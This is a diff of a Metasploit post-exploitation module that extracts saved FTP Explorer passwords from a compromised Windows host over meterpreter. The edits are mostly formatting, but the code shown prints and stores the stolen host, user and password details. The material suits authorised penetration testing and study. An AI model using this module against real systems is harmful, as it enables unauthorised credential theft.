@@ -1,9 +1,4 @@
 ##
-# $Id$
-##
-
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -22,12 +17,12 @@ class Metasploit3 < Msf::Post
 	def initialize(info={})
 		super( update_info( info,
 			'Name'          => 'Windows Gather FTP Explorer Saved Password Extraction',
-			'Version'       => '$Revision$',
-			'Description'   => %q{ This module finds saved login credentials for the
-						FTP Explorer (FTPx) FTP client for Windows.
-					},
+			'Description'   => %q{
+				This module finds saved login credentials for the FTP Explorer (FTPx)
+				FTP client for Windows.
+			},
 			'License'       => MSF_LICENSE,
-			'Author'        => [ 'Brendan Coles <bcoles[at]gmail.com>' ]
+			'Author'        => [ 'Brendan Coles <bcoles[at]gmail.com>' ],
 			'Platform'      => [ 'win' ],
 			'SessionTypes'  => [ 'meterpreter' ]
 		))
@@ -54,7 +49,7 @@ class Metasploit3 < Msf::Post
 			end
 			return condata
 		rescue Rex::Post::Meterpreter::RequestError => e
-			print_error "Received error code #{e.code} when reading #{path}"
+			print_error "Error when reading #{path} (#{e.message})"
 			return nil
 		end
 	end
@@ -77,7 +72,7 @@ class Metasploit3 < Msf::Post
 			next if pass.empty?
 
 			# show results to the user
-			print_good("HOST: #{host} PORT: #{port} USER: #{user} PASS: #{pass}")
+			print_good("#{host}:#{port} - USER: #{user} PASS: #{pass}")
 
 			# save results to the db
 			if session.db_record
@@ -86,13 +81,13 @@ class Metasploit3 < Msf::Post
 				source_id = nil
 			end
 			report_auth_info(
-						:host        => host,
-						:port        => port,
-						:source_id   => source_id,
-						:source_type => "exploit",
-						:user        => user,
-						:pass        => pass
-					)
+				:host        => host,
+				:port        => port,
+				:source_id   => source_id,
+				:source_type => "exploit",
+				:user        => user,
+				:pass        => pass
+			)
 		end
 	end
 
